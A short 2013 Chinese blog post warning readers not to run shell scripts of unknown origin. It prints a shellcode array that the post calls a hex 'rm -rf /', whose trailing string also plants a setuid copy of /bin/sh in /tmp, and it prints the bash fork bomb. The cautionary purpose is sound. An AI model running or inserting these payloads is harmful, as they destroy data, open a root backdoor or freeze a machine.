+++
title = "好奇殺死一隻貓"
date = "2013-10-29T02:12:00+08:00"
tags = ["geek"]
+++

除了不要亂點來路不明的連結外, 來路不明的 shell script 當然也不可以隨便執行哦!
```bash
char rmrf[] __attribute__ ((section(“.text”)))
= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
“cp -p /bin/sh /tmp/.cmd; chmod 4755
/tmp/.cmd;”;
```
***Warning:*** 這是 `rm –rf /` 的 hex 版本.

```bash
:(){ :|: & };:
```
***Warning:*** 定義一個會 fork 自己的 bash function, 然後 fork 他...
